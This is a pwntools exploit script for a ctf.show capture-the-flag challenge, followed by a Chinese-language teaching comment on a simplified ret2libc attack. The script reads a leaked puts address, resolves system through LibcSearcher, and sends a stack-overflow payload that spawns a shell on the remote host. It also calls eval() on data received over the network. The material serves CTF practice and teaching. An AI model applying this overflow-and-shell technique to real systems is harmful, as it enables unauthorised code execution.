from pwn import *
from LibcSearcher3 import *

offset = 0x9C + 4

p = remote('pwn.challenge.ctf.show', 28276)

p.recvuntil('puts: ')
puts_addr = eval(p.recvuntil("\n", drop = True))
success(puts_addr)
bin_sh_addr = 0x804b028
libc = LibcSearcher('puts', puts_addr)

libcbase = puts_addr - libc.dump('puts')

sys_addr = libcbase + libc.dump('system')

payload = b'a' * offset + p32(sys_addr) + p32(0) + p32(bin_sh_addr)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 简化版（puts地址已给出）
2. 简化点：
   - 程序直接打印puts地址，不需要自己泄露
   - 省去了第一次ROP链构造
3. 执行流程：
   - 程序启动时打印puts的地址
   - 接收地址，使用LibcSearcher识别libc版本
   - 计算system地址
   - 构造payload获取shell
4. 关键代码解析：
   p.recvuntil('puts: ')           - 等待"puts: "字符串
   puts_addr = eval(p.recvuntil("\n", drop = True))  - 接收地址并eval转换
   - drop=True表示不保留结束符\n
5. 与完整ret2libc的区别：
   - 不需要构造ROP链泄露地址
   - 直接利用程序提供的地址
   - 更简单，适合入门理解libc利用
6. bin_sh_addr = 0x804b028：
   - 这是BSS段地址，程序中可能有/bin/sh字符串
   - 或者需要提前写入
"""
